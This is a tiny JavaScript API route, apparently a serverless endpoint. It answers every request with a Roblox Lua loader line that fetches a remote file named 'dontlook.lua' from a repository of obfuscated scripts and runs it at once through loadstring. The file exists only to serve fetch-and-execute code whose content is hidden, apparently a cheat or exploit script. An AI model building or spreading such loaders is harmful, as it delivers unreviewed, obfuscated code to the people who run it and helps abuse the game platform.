export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send('loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-script-obfuscations/ftap/refs/heads/main/dontlook.lua"))()');
    }
    